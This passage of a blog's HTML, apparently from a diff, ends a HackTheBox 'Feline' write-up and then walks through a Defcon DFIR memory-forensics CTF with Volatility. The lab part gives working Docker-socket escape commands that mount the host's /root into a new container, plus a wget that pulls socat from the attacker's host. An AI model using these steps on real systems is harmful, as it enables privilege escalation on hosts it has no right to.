<span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;bind&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Source&quot;</span><span class="punctuation">:</span><span class="string">&quot;/var/run/docker.sock&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Destination&quot;</span><span class="punctuation">:</span><span class="string">&quot;/var/run/docker.sock&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Mode&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;RW&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Propagation&quot;</span><span class="punctuation">:</span><span class="string">&quot;rprivate&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">   <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p>Now we have the docker image name</p>
+<p>Let’s create a json configuration file</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;&#123;&quot;Image&quot;:&quot;188a2704d8b0&quot;,&quot;Cmd&quot;:[&quot;/bin/sh&quot;],&quot;DetachKeys&quot;:&quot;Ctrl-p,Ctrl-q&quot;,&quot;OpenStdin&quot;:true,&quot;Mounts&quot;:[&#123;&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/root&quot;,&quot;Target&quot;:&quot;/host_etc&quot;&#125;]&#125;&#x27;</span> &gt; container.json</span><br></pre></td></tr></table></figure>
+
+<p>and we create the image using the container.json configuration file</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -XPOST -H <span class="string">&quot;Content-Type: application/json&quot;</span> --unix-socket /var/run/docker.sock -d <span class="string">&quot;<span class="subst">$(cat container.json)</span>&quot;</span> http://localhost/containers/create</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Feline-Hard/image-20200902145656343.png" alt="image-20200902145656343"></p>
+<p>Next start our malicious container</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/2aba/start</span><br></pre></td></tr></table></figure>
+
+<p>replace the <em>32d862</em> to the image id your created</p>
+<p>after start the docker,use socat connect to the docker socket, however the machine doesnt have socat, we have to upload our own socat binary</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@2d24bf61767c:~<span class="comment"># which wget</span></span><br><span class="line"><span class="built_in">which</span> wget</span><br><span class="line">/usr/bin/wget</span><br><span class="line">root@2d24bf61767c:~<span class="comment"># which socat</span></span><br><span class="line"><span class="built_in">which</span> socat</span><br><span class="line">root@2d24bf61767c:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">todo.txt</span><br><span class="line">root@2d24bf61767c:~<span class="comment"># wget 10.10.14.16:1337/socat</span></span><br><span class="line">wget 10.10.14.16:1337/socat</span><br><span class="line">--2020-09-02 07:14:12--  http://10.10.14.16:1337/socat</span><br><span class="line">Connecting to 10.10.14.16:1337... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 375176 (366K) [application/octet-stream]</span><br><span class="line">Saving to: ‘socat’</span><br><span class="line"></span><br><span class="line">     0K .......... .......... .......... .......... .......... 13% 2.99M 0s</span><br><span class="line">    50K .......... .......... .......... .......... .......... 27% 6.38M 0s</span><br><span class="line">   100K .......... .......... .......... .......... .......... 40% 32.3M 0s</span><br><span class="line">   150K .......... .......... .......... .......... .......... 54% 7.64M 0s</span><br><span class="line">   200K .......... .......... .......... .......... .......... 68% 12.8M 0s</span><br><span class="line">   250K .......... .......... .......... .......... .......... 81% 6.75M 0s</span><br><span class="line">   300K .......... .......... .......... .......... .......... 95%  522K 0s</span><br><span class="line">   350K .......... ......                                     100%  135M=0.1s</span><br><span class="line"></span><br><span class="line">2020-09-02 07:14:12 (2.58 MB/s) - ‘socat’ saved [375176/375176]</span><br><span class="line"></span><br><span class="line">root@2d24bf61767c:~<span class="comment"># chmod +x socat</span></span><br><span class="line"><span class="built_in">chmod</span> +x socat</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">socat - UNIX-CONNECT:/var/run/docker.sock</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/containers/2aba/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span>:</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>tcp</span><br></pre></td></tr></table></figure>
+
+<p>and if it sucess, we receive </p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">101</span> UPGRADED</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/vnd.docker.raw-stream</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>tcp</span><br></pre></td></tr></table></figure>
+
+<p>and we are able to access the folder and get the root flag now.</p>
+<br/>
+<br/>
+<br/>
+
+<p><img src="/images/root.gif" alt="root"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/HackTheBox-Hard/">HackTheBox-Hard</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/hard/">hard</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/08/30/HTB-Feline/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/08/22/Defcon-DFIR-memory_forensic/">Defcon DFIR memory forensic CTF 2019</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Aug 22, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<h3 id="Memory-Image-https-www-dropbox-com-sh-4qfk1miauqbvqst-AAAVCI1G8Sc8xMoqK-TtmSbia-dl-0"><a href="#Memory-Image-https-www-dropbox-com-sh-4qfk1miauqbvqst-AAAVCI1G8Sc8xMoqK-TtmSbia-dl-0" class="headerlink" title="Memory Image: https://www.dropbox.com/sh/4qfk1miauqbvqst/AAAVCI1G8Sc8xMoqK_TtmSbia?dl=0"></a>Memory Image: <a target="_blank" rel="noopener" href="https://www.dropbox.com/sh/4qfk1miauqbvqst/AAAVCI1G8Sc8xMoqK_TtmSbia?dl=0">https://www.dropbox.com/sh/4qfk1miauqbvqst/AAAVCI1G8Sc8xMoqK_TtmSbia?dl=0</a></h3><h2 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1:"></a>Question 1:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What is the SHA1 <span class="built_in">hash</span> of triage.mem?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » <span class="built_in">sha1sum</span> memory.mem </span><br><span class="line">c95e8cc8c946f95a109ea8e47a6800de10a27abd  memory.mem</span><br></pre></td></tr></table></figure>
+
+<h2 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2:"></a>Question 2:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What profile is the most appropriate <span class="keyword">for</span> this machine? (ex: Win10x86_14393)</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<p>The first step of volatility is always find the image info of the memory dump.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility imageinfo -f memory.mem </span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/root/Desktop/forensic_images/memory.mem)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf800029f80a0L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff800029f9d00L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 1 : 0xfffff880009ee000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image <span class="built_in">date</span> and time : 2019-03-22 05:46:00 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> <span class="built_in">date</span> and time : 2019-03-22 01:46:00 -0400</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Got the answer as <em>Win7SP1x64</em></p>
+<h2 id="Question-3"><a href="#Question-3" class="headerlink" title="Question 3:"></a>Question 3:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What was the process ID of notepad.exe?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h2><p>We indicated the profile and use the <em>pslist</em> plugin to print all the running process</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 pslist | grep notepad</span><br><span class="line"><span class="attribute">Volatility</span> Foundation Volatility Framework <span class="number">2</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">0xfffffa80054f9060</span> notepad.exe            <span class="number">3032</span>   <span class="number">1432</span>      <span class="number">1</span>       <span class="number">60</span>      <span class="number">1</span>      <span class="number">0</span> <span class="number">2019</span>-<span class="number">03</span>-<span class="number">22</span> <span class="number">05</span>:<span class="number">32</span>:<span class="number">22</span> UTC+<span class="number">0000</span></span><br></pre></td></tr></table></figure>
+
+<p>and we got the answer pid as  <em>3032</em></p>
+<h2 id="Question-4"><a href="#Question-4" class="headerlink" title="Question 4:"></a>Question 4:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Name the child processes of wscript.exe.</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution:"></a>Solution:</h2><p>pstree will indicate child process using idention and periods.</p>
+<p>Let’s grep the top and bottom 3 line of process <em>wscript.exe</em></p>
+<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 pstree | grep -C<span class="number"> 3 </span>wscript.exe </span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">. 0xfffffa8004798320:calc.exe                       <span class="number"> 3548 </span> <span class="number"> 1432 </span>    <span class="number"> 3 </span>   <span class="number"> 77 </span>2019-03-22 05:34:43 UTC+0000</span><br><span class="line">. 0xfffffa80053d3060:POWERPNT.EXE                   <span class="number"> 4048 </span> <span class="number"> 1432 </span>   <span class="number"> 23 </span>  <span class="number"> 765 </span>2019-03-22 05:35:09 UTC+0000</span><br><span class="line">. 0xfffffa8004905620:hfs.exe                        <span class="number"> 3952 </span> <span class="number"> 1432 </span>    <span class="number"> 6 </span>  <span class="number"> 214 </span>2019-03-22 05:34:51 UTC+0000</span><br><span class="line">.. 0xfffffa8005a80060:wscript.exe                   <span class="number"> 5116 </span> <span class="number"> 3952 </span>    <span class="number"> 8 </span>  <span class="number"> 312 </span>2019-03-22 05:35:32 UTC+0000</span><br><span class="line">... 0xfffffa8005a1d9e0:UWkpjFjDzM.exe               <span class="number"> 3496 </span> <span class="number"> 5116 </span>    <span class="number"> 5 </span>  <span class="number"> 109 </span>2019-03-22 05:35:33 UTC+0000</span><br><span class="line">.... 0xfffffa8005bb0060:cmd.exe                     <span class="number"> 4660 </span> <span class="number"> 3496 </span>    <span class="number"> 1 </span>   <span class="number"> 33 </span>2019-03-22 05:35:36 UTC+0000</span><br><span class="line">. 0xfffffa80054f9060:notepad.exe                    <span class="number"> 3032 </span> <span class="number"> 1432 </span>    <span class="number"> 1 </span>   <span class="number"> 60 </span>2019-03-22 05:32:22 UTC+000</span><br></pre></td></tr></table></figure>
+
+<p>and we got the answer <em>UWkpjFjDzM.exe</em></p>
+<h2 id="Question-5"><a href="#Question-5" class="headerlink" title="Question 5:"></a>Question 5:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What was the IP address of the machine at the time the RAM dump was created?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution:"></a>Solution:</h2><p>We have to find the ip address, using the plugin <em>netscan</em></p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem <span class="attribute">--profile</span>=Win7SP1x64 netscan | grep -v <span class="string">&#x27;127.0.0.1\|0.0.0.0&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Use grep to filter localhost ip address. The owner of system process <em>svchost.exe</em> seems bind to ip address 10.0.0.101:55736 which is the IP address when the RAM dump is created</p>
+<p><img src="/images/Defcon-DFIR-memory-forensic-CTF-2019/image-20200822132847349.png" alt="image-20200822132847349"></p>
+<h2 id="Question-6"><a href="#Question-6" class="headerlink" title="Question 6"></a>Question 6</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Based <span class="keyword">on</span> the answer regarding <span class="keyword">to</span> the infected PID, can you determine what the IP <span class="keyword">of</span> the attacker was?</span><br><span class="line"></span><br><span class="line">Flag <span class="keyword">Format</span>-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> the – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><p>Going back to question 4 we found out the malicious process is <em>UWkpjFjDzM.exe</em></p>
+<p>Still using the same <em>netscan</em> plugin,we find out there’s a connection to <em>10.0.0.106</em> port 4444 is one of the favorite port for malicious connection from hacker </p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 netscan | grep UWkpjFjDzM.exe         </span><br><span class="line"><span class="attribute">Volatility</span> Foundation Volatility Framework <span class="number">2</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">0x13e397190</span>        TCPv4    <span class="number">10.0.0.101:49217</span>               <span class="number">10.0.0.106:4444</span>      ESTABLISHED      <span class="number">3496</span>     UWkpjFjDzM.exe</span><br></pre></td></tr></table></figure>
+
+<p>So the malicious hacker ip is <em>10.0.0.106</em></p>
+<h2 id="Question-7"><a href="#Question-7" class="headerlink" title="Question 7"></a>Question 7</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">What process <span class="type">name</span> <span class="keyword">is</span> VCRUNTIME140.dll associated <span class="keyword">with</span>?</span><br><span class="line"></span><br><span class="line">Flag <span class="keyword">Format</span>-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> the – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><p>We have to use the <em>dlllist</em> plugin</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem <span class="attribute">--profile</span>=Win7SP1x64 dlllist &gt; dlllist</span><br></pre></td></tr></table></figure>
+
+<p>We find the keyword dll <em>VCRUNTIME140.dll</em></p>
+<p>we found the malicious software <em>OfficeClickToRun.exe</em></p>
+<p>However beware that the process name should be <em>OfficeClickToR</em></p>
+<p><img src="/images/Defcon-DFIR-memory-forensic-CTF-2019/image-20200822134112881.png" alt="image-20200822134112881"></p>
+<h2 id="Question-8"><a href="#Question-8" class="headerlink" title="Question 8"></a>Question 8</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What is the md5 <span class="built_in">hash</span> value the potential malware on the system?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution :"></a>Solution :</h2><p>We are not able to identify the hash directly in memory dump.</p>
+<p>We have to use one of the volatility function <em>Procdump</em></p>
+<p>At first I though the malicious process is <em>OfficeClickToR</em></p>
+<p>but it appears to be <em>UWkpjFjDzM.exe</em> we found earlier one</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory<span class="selector-class">.mem</span> <span class="attr">--profile</span>=Win7SP1x64 procdump -<span class="selector-tag">p</span> <span class="number">3496</span> <span class="attr">--dump-dir</span> .</span><br><span class="line">Volatility Foundation Volatility Framework <span class="number">2.6</span></span><br><span class="line"><span class="function"><span class="title">Process</span><span class="params">(V)</span></span>         ImageBase          Name                 Result</span><br><span class="line">------------------ ------------------ -------------------- ------</span><br><span class="line"><span class="number">0</span>xfffffa8005a1d9e0 <span class="number">0</span>x0000000000400000 UWkpjFjDzM<span class="selector-class">.exe</span>       OK: executable.<span class="number">3496</span><span class="selector-class">.exe</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » md5sum <span class="built_in">executable</span>.<span class="number">3496</span>.<span class="keyword">exe</span> </span><br><span class="line"><span class="number">690</span>ea20bc3bdfb328e23005d9a80c290  <span class="built_in">executable</span>.<span class="number">3496</span>.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>
+
+<p>and we got the md5 hash</p>
+<h2 id="Question-9"><a href="#Question-9" class="headerlink" title="Question 9"></a>Question 9</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">What <span class="keyword">is</span> the LM hash <span class="keyword">of</span> bobs account?</span><br><span class="line"></span><br><span class="line">Flag <span class="keyword">Format</span>-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> the – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution :"></a>Solution :</h2><p>Use the <em>hashdump</em> plugin</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 hashdump                     </span><br><span class="line"><span class="attribute">Volatility</span> Foundation Volatility Framework <span class="number">2</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">Administrator</span>:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="attribute">Guest</span>:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="attribute">Bob</span>:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p>and we got bob’s hash</p>
+<h2 id="Question-10"><a href="#Question-10" class="headerlink" title="Question 10"></a>Question 10</h2><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">What protections <span class="keyword">does</span> <span class="keyword">the</span> VAD node <span class="keyword">at</span> <span class="number">0xfffffa800577ba10</span> have?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> <span class="keyword">the</span> – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> <span class="keyword">the</span> xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h2><p>simple</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 vadinfo | grep -A <span class="number">5</span> &#x27;<span class="number">0</span>xfffffa800577ba10&#x27;                                                                                                                <span class="number">130</span> ↵</span><br><span class="line"><span class="attribute">Volatility</span> Foundation Volatility Framework <span class="number">2</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">VAD</span> node @ <span class="number">0</span>xfffffa800577ba10 Start <span class="number">0</span>x0000000000030000 End <span class="number">0</span>x0000000000033fff Tag Vad </span><br><span class="line"><span class="attribute">Flags</span>: NoChange: <span class="number">1</span>, Protection: <span class="number">1</span></span><br><span class="line"><span class="attribute">Protection</span>: PAGE_READONLY</span><br><span class="line"><span class="attribute">Vad</span> Type: VadNone</span><br><span class="line"><span class="attribute">ControlArea</span> @fffffa8005687a50 Segment fffff8a000c4f870</span><br><span class="line"><span class="attribute">NumberOfSectionReferences</span>:          <span class="number">1</span> NumberOfPfnReferences:           <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>The answer is <em>PAGE_READONLY</em></p>
+<h2 id="Question-11"><a href="#Question-11" class="headerlink" title="Question 11"></a>Question 11</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">There was a VBS script run on the machine. What is the name of the script? (submit without file extension)</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution:"></a>Solution:</h2><p>After some research find out that, wscript.exe is tasked with executing the VBScript files.</p>
+<p>[What is wscript.exe?]([<a target="_blank" rel="noopener" href="https://www.file.net/process/wscript.exe.html#:~:text=The%20genuine%20wscript.exe%20file,any%20harm%20to%20your%20PC.]">https://www.file.net/process/wscript.exe.html#:~:text=The%20genuine%20wscript.exe%20file,any%20harm%20to%20your%20PC.]</a>(<a target="_blank" rel="noopener" href="https://www.file.net/process/wscript.exe.html#:~:text=The">https://www.file.net/process/wscript.exe.html#:~:text=The</a> genuine wscript.exe file,any harm to your PC.))</p>
+<p>Hence, we can perform a <em>memory dump</em> on <em>wscript.exe</em> and use strings to identify which VBScripts file has been executed</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 memdump -p 5116 --dump-dir .                                                                                                                              2 ↵</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">************************************************************************</span><br><span class="line">Writing wscript.exe [  5116] to 5116.dmp</span><br><span class="line">kali Desktop/forensic_images » strings 5116.dmp| grep vbs                                   </span><br><span class="line"><span class="string">&quot;C:\Windows\System32\wscript.exe&quot;</span> //B //NOLOGO %TEMP%\vhjReUDEuumrX.vbs</span><br><span class="line">%TEMP%\vhjReUDEuumrX.vbs</span><br><span class="line">%TEMP%\vhjReUDEuumrX.vbs</span><br><span class="line">vbscript.dll</span><br><span class="line">vbscript.pdb</span><br><span class="line">vbscript</span><br><span class="line">.vbs</span><br><span class="line">.vbs</span><br><span class="line">x86_microsoft-windows-m..ents-mdac-ado15-vbs_31bf3856ad364e35_none_9360988f60461a77</span><br><span class="line">amd64_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_444030db0904e80b</span><br><span class="line">amd64_microsoft-windows-m..nts-mdac-rds-ce-vbs_31bf3856ad364e35_none_17691405728212bf</span><br><span class="line">amd64_microsoft-windows-scripting-vbscript_31bf3856ad364e35_none_1dd485790300b91fn</span><br><span class="line">x86_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_e821955750a776d5</span><br><span class="line">x86_microsoft-windows-m..nts-mdac-rds-ce-vbs_31bf3856ad364e35_none_bb4a7881ba24a189</span><br><span class="line">wow64_microsoft-windows-scripting-vbscript_31bf3856ad364e35_none_28292fcb37617b1a</span><br><span class="line">amd64_microsoft-windows-m..ents-mdac-ado15-vbs_31bf3856ad364e35_none_ef7f341318a38bad</span><br><span class="line">vbscript</span><br><span class="line">.vbs</span><br><span class="line">.vbs</span><br><span class="line">x86_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_fc14ed9ab50fcbf0</span><br><span class="line">amd64_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_5833891e6d6d3d26</span><br><span class="line">version:1|.ade:3|.adp:3|.app:3|.asp:3|.bas:3|.bat:3|.bz:3|.bz2:3|.cer:3|.chm:3|.class:3|.cmd:3|.com:3|.<span class="built_in">command</span>:3|.cpl:3|.crt:3|.csh:3|.desktop:3|.exe:3|.fxp:3|.gz:3|.hex:3|.hlp:3|.hqx:3|.hta:3|.inf:3|.ini:3|.ins:3|.isp:3|.its:3|.job:3|.js:3|.jse:3|.ksh:3|.lnk:3|.lzh:3|.mad:3|.maf:3|.mag:3|.mam:3|.maq:3|.mar:3|.mas:3|.mat:3|.mau:3|.mav:3|.maw:3|.mda:3|.mde:3|.mdt:3|.mdw:3|.mdz:3|.msc:3|.msi:3|.msp:3|.mst:3|.ocx:3|.ops:3|.pcd:3|.pi:3|.pif:3|.prf:3|.prg:3|.pst:3|.rar:3|.reg:3|.scf:3|.scr:3|.sct:3|.sea:3|.shb:3|.shs:3|.sit:3|.tar:3|.tgz:3|.tmp:3|.url:3|.vb:3|.vbe:3|.vbs:3|.vsmacros:3|.vss:3|.vst:3|.vsw:3|.webloc:3|.ws:3|.wsc:3|.wsf:3|.wsh:3|.zip:3|.zlo:3|.zoo:3|.pdf:2|.fdf:2</span><br><span class="line">version:1|shell:3|hcp:3|ms-help:3|ms-its:3|ms-itss:3|its:3|mk:3|mhtml:3|<span class="built_in">help</span>:3|disk:3|afp:3|disks:3|telnet:3|ssh:3|javascript:1|vbscript:1|acrobat:2|mailto:2|file:2</span><br><span class="line">eventvwr.exegatherNetworkInfo.vbs</span><br><span class="line">slmgr.vbs</span><br><span class="line">winrm.vbs</span><br><span class="line">amd64_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_444030db0904e80b</span><br><span class="line">.vbs</span><br><span class="line">amd64_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_5833891e6d6d3d26</span><br><span class="line">x86_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_fc14ed9ab50fcbf0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The answer is <em>vhjReUDEuumrX.vbs</em></p>
+<h2 id="Question-12"><a href="#Question-12" class="headerlink" title="Question 12"></a>Question 12</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">An application was run at 2019-03-07 23:06:58 UTC, what is the name of the program? (Include extension)</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h2><p>I have no clue at first, but manage to find the plugin <em>shimache</em> which indicates the timestamp</p>
+<p><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2015/06/caching_out_the_val.html">Caching Out: The Value of Shimcache for Investigators</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 shimcache | grep <span class="string">&#x27;2019-03-07 23:06:58&#x27;</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">2019-03-07 23:06:58 UTC+0000   \??\C:\Program Files (x86)\Microsoft\Skype <span class="keyword">for</span> Desktop\Skype.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We find out The <em>skype</em> application is running</p>
